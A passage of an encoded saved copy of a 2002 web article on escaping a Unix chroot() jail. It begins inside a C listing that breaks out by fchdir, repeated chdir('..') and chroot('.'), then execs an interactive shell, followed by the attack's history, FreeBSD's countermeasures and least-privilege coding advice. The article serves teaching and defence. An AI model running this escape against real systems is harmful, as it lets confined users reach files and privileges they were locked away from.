+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0exit(1);=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">065=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0}=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">066=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#endif=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">067=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">068=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0/*=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">069=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0Next=A0we=A0chroot()=A0to=A0the=A0temporary=A0directory=A0=A0</code=
+></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">070=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0*/=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">071=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0if=A0(chroot(TEMP_DIR)&lt;0)=A0{=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">072=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0fprintf(stderr,"Failed=A0to=A0chroot=A0to=A0%s=A0-=A0%s\n",T=
+EMP_DIR,=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">073=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0strerror(errno));=A0=A0</code></font=
+></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">074=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0exit(1);=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">075=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0}=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">076=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">077=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#ifdef=A0NEED_FCHDIR=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">078=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0/*=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">079=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0Partially=A0break=A0out=A0of=A0the=A0chroot=A0by=A0doing=A0an=A0fch=
+dir()=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">080=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">081=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0This=A0only=A0partially=A0breaks=A0out=A0of=A0the=A0chroot()=A0sinc=
+e=A0whilst=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">082=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0our=A0current=A0working=A0directory=A0is=A0outside=A0of=A0the=A0chr=
+oot()=A0jail,=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">083=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0our=A0root=A0directory=A0is=A0still=A0within=A0it.=A0Thus=A0anythin=
+g=A0which=A0refers=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">084=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0to=A0"/"=A0will=A0refer=A0to=A0files=A0under=A0the=A0chroot()=A0poi=
+nt.=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">085=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">086=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0Note:=A0Only=A0required=A0if=A0chroot()=A0changes=A0the=A0calling=
+=A0program's=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">087=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0=A0=A0=A0=A0=A0=A0working=A0directory=A0to=A0the=A0directory=A0give=
+n=A0to=A0chroot().=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">088=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">089=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0*/=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">090=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0if=A0(fchdir(dir_fd)&lt;0)=A0{=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">091=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0fprintf(stderr,"Failed=A0to=A0fchdir=A0-=A0%s\n",=A0=A0</cod=
+e></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">092=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0=A0strerror(errno));=A0=A0</code></font=
+></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">093=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0exit(1);=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">094=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0}=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">095=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0close(dir_fd);=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">096=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0#endif=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">097=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">098=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0/*=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">099=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0Completely=A0break=A0out=A0of=A0the=A0chroot=A0by=A0recursing=A0up=
+=A0the=A0directory=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">100=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0tree=A0and=A0doing=A0a=A0chroot=A0to=A0the=A0current=A0working=A0di=
+rectory=A0(which=A0will=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">101=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0be=A0the=A0real=A0"/"=A0at=A0that=A0point).=A0We=A0just=A0do=A0a=A0=
+chdir("..")=A0lots=A0of=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">102=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0times=A0(1024=A0times=A0for=A0luck=A0:).=A0If=A0we=A0hit=A0the=A0re=
+al=A0root=A0directory=A0before=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">103=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0we=A0have=A0finished=A0the=A0loop=A0below=A0it=A0doesn't=A0matter=
+=A0as=A0..=A0in=A0the=A0root=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">104=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0directory=A0is=A0the=A0same=A0as=A0.=A0in=A0the=A0root.=A0=A0</code=
+></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">105=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">106=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0We=A0do=A0the=A0final=A0break=A0out=A0by=A0doing=A0a=A0chroot(".")=
+=A0which=A0sets=A0the=A0root=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">107=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0directory=A0to=A0the=A0current=A0working=A0directory=A0-=A0at=A0thi=
+s=A0point=A0the=A0real=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">108=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0root=A0directory.=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">109=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0*/=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">110=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0for(x=3D0;x&lt;1024;x++)=A0{=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">111=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0chdir("..");=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">112=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0}=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">113=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0chroot(".");=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">114=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">115=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0/*=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">116=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0**=A0We're=A0finally=A0out=A0-=A0so=A0exec=A0a=A0shell=A0in=A0interactiv=
+e=A0mode=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">117=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0*/=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">118=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0if=A0(execl("/bin/sh","-i",NULL)&lt;0)=A0{=A0=A0</code></font></td=
+></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">119=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0fprintf(stderr,"Failed=A0to=A0exec=A0-=A0%s\n",strerror(errn=
+o));=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">120=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0=A0=A0exit(1);=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">121=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0=A0=A0}=A0=A0</code></font></td></tr>
+<tr><td bgcolor=3D"#bfbfbf" align=3D"right">122=A0</td>
+    <td bgcolor=3D"#000000" align=3D"left"><font color=3D"#ffffff"><code>=
+=A0}=A0=A0</code></font></td></tr>
+</tbody></table>
+</div>
+<br>
+
+
+
+<p>
+This topic has been discussed on the security column of <a href=3D"http://w=
+ww.sunworld.com/sunworldonline/">SunWorld Online</a> which is written by
+Carole Fennelly; the
+<a href=3D"http://www.sunworld.com/sunworldonline/swol-08-1999/swol-08-secu=
+rity.html">August 1999</a>
+and=20
+<a href=3D"http://www.sunworld.com/swol-01-1999/swol-01-security.html">Janu=
+ary 1999</a>
+editions cover most of the <tt>chroot()</tt> topics. In the
+<a href=3D"http://www.sunworld.com/sunworldonline/swol-08-1999/swol-08-secu=
+rity.html">August 1999</a>
+edition Carole goes into how to prevent the attack above from working - the
+method is a nasty hack involving <tt>fsdb</tt> (the file system debugger)=
+ and
+a temporary file system<sup><a href=3D"#footnote-2">[2]</a></sup>.
+Basically the method involves fixing the ".." link at
+the root of the temporary file system so that it points to the root of the
+file system in much the same way that ".." at the root directory does.
+</p>
+
+<p>
+It should be noted that the attack above is quite well known. The fact that
+it was possible<sup><a href=3D"#footnote-3">[3]</a></sup> was alleuded to=
+ in "<i>An evening with Berferd</i>"<sup><a href=3D"#footnote-4">[4]</a></s=
+up>
+An exploit<sup><a href=3D"#footnote-5">[5]</a></sup>
+against the <tt>wu-ftpd</tt> FTP daemon was also posted to the=20
+<a href=3D"http://www.securityfocus.com/forums/bugtraq/faq.html">BugTraq</a=
+> mailing
+list on 1999-03-25. The post containing the exploit is held within the
+BugTraq archives - see <a href=3D"http://www.securityfocus.com/archive/1/12=
+962">
+<tt>http://www.securityfocus.com/archive/1/12962</tt></a> for details.
+</p>
+
+<p>
+Finally it should be noted that not all version of Unix are vulnerable to
+this attack. <a href=3D"http://www.freebsd.org/">FreeBSD</a> <tt>4.x</tt>=
+ and
+above have a better <tt>chroot()</tt> system call. It can be made to fail
+if the process has any file descriptors open on a directory. This works by
+stopping the attack above which essentially works due to a file handle being
+open on a directory.
+</p>
+<p>
+Have a look at the <a href=3D"http://www.freebsd.org/">FreeBSD</a> <tt>4.x<=
+/tt>
+<a href=3D"http://www.freebsd.org/cgi/man.cgi?query=3Dchroot&amp;sektion=3D=
+2&amp;apropos=3D0&amp;manpath=3DFreeBSD+4.0-RELEASE">manual page for <tt>ch=
+root()</tt></a> for more
+details. Also have a look at the
+<a href=3D"http://www.freebsd.org/cgi/man.cgi?query=3Djail&amp;sektion=3D2&=
+amp;apropos=3D0&amp;manpath=3DFreeBSD+4.0-RELEASE">manual page for <tt>jail=
+()</tt></a> which uses
+<tt>chroot()</tt> and can limit a process further under
+<a href=3D"http://www.freebsd.org/">FreeBSD</a>.
+</p>
+
+<div align=3D"center">
+ <h2>
+  <a name=3D"notes">Coding with <tt>chroot()</tt> in anger</a>
+ </h2>
+</div>
+<p>
+A very important aspect of writing secure code is the
+principle of
+"<strong>least privilage</strong>". That is, the code should run as the lea=
+st
+powerful user which is able to do the task required.
+</p>
+
+<p>
+The call to <tt>chroot()</tt> is normally used to ensure that code run after
+it can only access files at or below a given directory.
+Originally, <tt>chroot()</tt> was used to test systems software in a safe
+environment. It is now generally used to lock users into an
+area of the file system so that they can not look at or affect the importan=
+t parts of the system
+they are on. For example, the most common use of <tt>chroot()</tt> is ensur=
+ing
+that when user of an anonymous FTP site can not view important
+system configuration files<sup><a href=3D"#footnote-6">[6]</a></sup>
+</p>
+
+<p>
+This normally means that the user will not be running as <tt>root</tt>. If=
+ this
+is the case the call to <tt>chroot()</tt> should look something like the
+following:
+</p>
+
+<blockquote>
+<p><img src=3D"file:///home/andy/Documents/blog/reference/linux/container/B=
+reaking%20out%20of%20a%20chroot%28%29%20padded%20cell_files/top_divider.gif=
+" alt=3D"+------------------" border=3D"0" height=3D"10" width=3D"120"></p>
+<blockquote><pre>chdir("/foo/bar");
+chroot("/foo/bar");
+setuid(<i>non zero UID</i>);
+</pre></blockquote>
+<p><img src=3D"file:///home/andy/Documents/blog/reference/linux/container/B=
+reaking%20out%20of%20a%20chroot%28%29%20padded%20cell_files/bottom_divider.=
+gif" alt=3D"+------------------" border=3D"0" height=3D"10" width=3D"120"><=
+/p>
+</blockquote>
+
+<p>
+Where <tt><i>non zero UID</i></tt> is the UID the user should be using. This
+should be a value other than <tt>0</tt>, <i>i.e.</i>
+not the <tt>root</tt> user. If this is done there should be no way to gain
+<tt>root</tt> privilages unless an attacker uses something within the
+<tt>chroot()</tt> jail to gain those privilages.
+</p>
+
+<p>
+The <tt>seteuid()</tt> call should not be used if it can be helped as this
+does not change the
+real UID of the process, only its <strong>effective</strong> UID. It is
+possible of a process which has a real UID of <tt>0</tt> to do a
+<tt>seteuid(0)</tt> to regain <tt>root</tt> privilages even if its effective
+UID is not <tt>0</tt> - its the real UID which matters.
+</p>
+
+<p>
+There are some cases where it is not easily possible to make use of the
+<tt>setuid()</tt> call. In these cases, <tt>seteuid()</tt> could be looked
+at. However the developer has to bear in mind that it is a simple
+hop-skip-<tt>seteuid(0)</tt> for a process to regain its <tt>root</tt>
+privilages and then use the method above to break out of the <tt>chroot()</=
+tt>
+jail. The only real reason for making use of the <tt>seteuid()</tt> call
+is if the process needs to do something as <tt>root</tt> on behalf of the=
+ user.
+One example of this is the use of <tt>PASV</tt> FTP connections as the FTP
+server will often use ports in the range of 1 to 1024 which requires
+<tt>root</tt> privilages.
+</p>
+
+<p>
+Such situations can be coded around, however they tend to have their own
+problems as well.
+</p>
+
+<p></p><hr noshade=3D"noshade"><p></p>
+<p><table border=3D"0">
+<tbody><tr><th valign=3D"top" align=3D"left"><a name=3D"footnote-1">[1]</a>=
+</th>
+    <td><p>The root directory (<i>i.e.</i> <tt>/</tt>) is stored within each
+process's entry in the process table. All the <tt>chroot()</tt> system
+call does is to change the location of the root directory for that process.=
+</p>
+<p>Under Solaris the location of the
+root directory is stored in the <tt>user</tt> structure as a pointer to
+a <tt>vnode</tt> structure. <i>i.e.</i> <tt>user.u_rdir</tt> is a
+<tt>struct vnode *</tt>. The <tt>user</tt> structure, available from
+<tt>/usr/include/sys/user.h</tt>, can be found by referencing the
+<tt>p_user</tt> entry in the <tt>proc</tt> structure which even process is
+given. See <tt>/usr/include/sys/proc.h</tt> for details of the <tt>proc</tt>
+structure.</p></td></tr>
+<tr><th valign=3D"top" align=3D"left"><a name=3D"footnote-2">[2]</a></th>
+    <td>It involves a temporary file system as <tt>fsck</tt>
+would complain <strong>bitterly</strong> if it was run over a file system
+which had this protection method run over it.</td></tr>
+<tr><th valign=3D"top" align=3D"left"><a name=3D"footnote-3">[3]</a></th>
+    <td>Which got me thinking in the first place about
+how you could do the above</td></tr>
+<tr><th valign=3D"top" align=3D"left"><a name=3D"footnote-4">[4]</a></th>
+    <td>
+<p>"<i>An evening with Berford in which a Cracker is Lured, Endured and
+Studied</i>" is a document written by Bill Cheswick which cronicles a
+crackers actitivies after being lured in a <tt>chroot()</tt>ed padded cell.
+</p>
+</td></tr>
+<tr><th valign=3D"top" align=3D"left"><a name=3D"footnote-5">[5]</a></th>
+    <td>The <tt>realpath()</tt> buffer over-run is used in this one</td></t=
+r>
+<tr><th valign=3D"top" align=3D"left"><a name=3D"footnote-6">[6]</a></th>
+    <td><i>i.e.</i> <tt>/etc/passwd</tt> on systems which
+do not use a shadow password file</td></tr>
+</tbody></table></p>
+
+
+
+<!-- End content -->
+
+
+<!-- Begin footer -->
+
+
+
+<div align=3D"center">
+
+
+
+<!-- Begin navigation bar -->
+
+<table bgcolor=3D"#bfbfbf" border=3D"0" cellpadding=3D"4" cellspacing=3D"0"=
+ width=3D"100%"><tbody><tr><th colspan=3D"3"> <table border=3D"0" cellpaddi=
+ng=3D"0" cellspacing=3D"0" width=3D"100%">
+    <tbody><tr><td align=3D"left"><a href=3D"http://www.bpfh.net/"><font si=
+ze=3D"-1">[Root]</font></a>=A0=A0<a href=3D"http://www.bpfh.net/simes/compu=
+ting/Bill_Cheswick_berferd.ps.gz"><font size=3D"-1">[Prev]</font></a>=A0<a=
+ href=3D"http://www.bpfh.net/simes/computing/"><font size=3D"-1">[Idx]</fon=
+t></a>=A0<a href=3D"http://www.bpfh.net/simes/computing/Bill_Cheswick_berfe=
+rd.ps.gz"><font size=3D"-1">[Next]</font></a></td>
+        <td align=3D"right"><font size=3D"-1">http://<a href=3D"http://www.=
+bpfh.net/">www.bpfh.net</a>/<a href=3D"http://www.bpfh.net/simes/">simes</a=
+>/<a href=3D"http://www.bpfh.net/simes/computing/">computing</a>/<a href=3D=
+"http://www.bpfh.net/simes/computing/chroot-break.html">chroot-break.html</=
+a></font>=A0</td></tr>
+    </tbody></table></th>
+</tr><tr><td valign=3D"top" align=3D"left">=A0<a href=3D"http://www.bpfh.ne=
+t/index/"><font size=3D"-1">[Index]</font></a>=A0<a href=3D"http://www.bpfh=
+.net/about/"><font size=3D"-1">[About]</font></a></td>
+    <th><a href=3D"http://www.engelschall.com/sw/wml/">Powered by WML</a></=
+th>
+    <td valign=3D"bottom" align=3D"right"><table border=3D"0" cellpadding=
+=3D"0" cellspacing=3D"0">
+ <tbody><tr><td><font size=3D"-1"><a href=3D"http://www.bpfh.net/sitemap/au=
+thors/by-author/simes.html">Author</a>:=A0</font></td>
+     <td><font size=3D"-1"><strong><a href=3D"http://www.bpfh.net/simes/">S=
+imes</a></strong></font></td></tr>
+ <tr><td><font size=3D"-1">Created:=A0</font></td>
+     <td><font size=3D"-1">2002-05-12</font></td></tr>
+ <tr><td><font size=3D"-1">Last changed:=A0</font></td>
+     <td><font size=3D"-1">2002-05-12</font></td></tr>
+</tbody></table>
+</td></tr></tbody></table>
+
+<!-- End navigation bar -->
+
+
+
+<div><table border=3D"0" width=3D"100%">
+<tbody><tr>
+ <td rowspan=3D"2" align=3D"left">=A0</td>
+ <td valign=3D"bottom" align=3D"center"><table width=3D"100%">
+<tbody><tr><td align=3D"left"><font size=3D"-2"><a href=3D"http://www.bpfh.=
+net/sitemap/authors/by-author/simes.html">More by the same author</a></font>
+</td>
+    <td align=3D"right"><font size=3D"-2">Comments? EMail webmaster@bpfh.ne=
+t</font></td></tr>
+</tbody></table>
+</td>
+ <td rowspan=3D"2" align=3D"right">=A0</td>
+</tr>
+<tr>
+  <td valign=3D"top" align=3D"center"><font size=3D"-2">=A9 <strong><a href=
+=3D"http://www.bpfh.net/simes/">Simes</a></strong></font></td>
+</tr>
+</tbody></table></div>
+</div>
+
+
+</body></html>
+------=_NextPart_000_0000_94135694.524684C0
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: file:///home/andy/Documents/blog/reference/linux/container/Breaking%20out%20of%20a%20chroot%28%29%20padded%20cell_files/top_divider.gif
+
+R0lGODlheAAKAPAAAP///wAAACH5BAEAAAAALAAAAAB4AAoAAAI5jI+py+0Po5y02ouz3rz7D4bi
+BZTmiabqyrbuC8cuItf2jefzoff+DwTQgsSiETU8Kpe6JPMJdRUAADs=
+------=_NextPart_000_0000_94135694.524684C0
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: file:///home/andy/Documents/blog/reference/linux/container/Breaking%20out%20of%20a%20chroot%28%29%20padded%20cell_files/bottom_divider.gif
+
+R0lGODlheAAKAPAAAP///wAAACH5BAEAAAAALAAAAAB4AAoAAAI5jAOpy+0Po5y0yoOs3rz7iH3i
+SJZAaKbqyqDsC39uTNcXhuf6zvf+DwwKh8Si8YhMKpfMpvMJjR4LADs=
+------=_NextPart_000_0000_94135694.524684C0
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: file:///home/andy/Documents/blog/reference/linux/container/Breaking%20out%20of%20a%20chroot%28%29%20padded%20cell_files/ball.gif
+
+R0lGODlhDgAOAPUAAKbL/46q/zA0/yQg/xQQ/xgQ/wwI/wAA/wQA/wgA7wgA5wQA3////wwI1wQA
+12Vhz21hz0VBzxAQzwQAz3l5x4J5xwQAxwAAvgQAvgAAtgQArklJnggAngQAljAwjhQQhgAAhhAQ
+cQQAcQAAaQQAYQAAWQAASQQASQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAwALAAAAAAOAA4AAAZjQIZw
+SCwaj8RKRCKJVI4Qx+GASFggRcrkQBAYFBYOhRg5GAKAguPS+RAlCINg0LhwQKX3QrGYZO4keUMR
+FxcYGnclJiFEFB0cHSAiJCcmG0UPIyOKJiYeRxQhJSUhl0inqERBADs=
+------=_NextPart_000_0000_94135694.524684C0--
